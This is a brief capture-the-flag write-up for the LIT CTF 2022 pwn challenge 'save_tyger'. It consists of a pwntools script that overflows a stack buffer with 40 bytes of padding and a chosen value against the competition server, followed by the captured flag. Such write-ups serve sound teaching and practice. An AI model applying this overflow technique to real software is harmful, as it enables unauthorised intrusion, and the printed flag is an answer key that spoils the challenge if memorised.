# LIT CTF 2022 – save_tyger

* **Category:** pwn
* **Points:** 500

## Challenge

> Can you save our one and only Tyger?

## Solution

```python
from pwn import *
elf = context.binary = ELF('./save_tyger',checksec=False)
#p = process()
p = remote('litctf.live',31786)

payload = b'A' * 40            # Padding
payload += p64(0xabadaaab)     # value into rdi -> first param

log.info(p.clean())
p.sendline(payload)
p.interactive()
```
More info:</br>
https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions
```
LITCTF{y4yy_y0u_sav3d_0ur_m41n_or94n1z3r}
```
